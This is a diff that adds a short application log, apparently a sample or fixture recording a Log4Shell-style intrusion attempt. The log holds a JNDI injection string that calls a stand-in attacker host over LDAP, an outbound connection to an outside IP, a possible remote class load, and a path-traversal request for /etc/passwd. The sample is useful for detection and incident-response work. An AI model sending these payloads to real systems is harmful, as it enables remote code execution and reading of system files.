@@ -1,0 +1,7 @@
+2024-01-15 02:10:01 INFO  Healthcheck ok
+2024-01-15 03:21:01 INFO  GET /api/v1/orders status=200
+2024-01-15 03:22:09 ERROR Error looking up resource ${jndi:ldap://evil.example/a}
+2024-01-15 03:22:09 WARN  javax.naming.InitialContext lookup triggered by JndiLookup
+2024-01-15 03:22:10 INFO  outbound connect 185.220.101.91:1389 (ldap)
+2024-01-15 03:22:12 ERROR Uncaught exception in request thread — possible classload from remote codebase
+2024-01-15 03:23:40 WARN  rejected path traversal /api/v1/../../etc/passwd
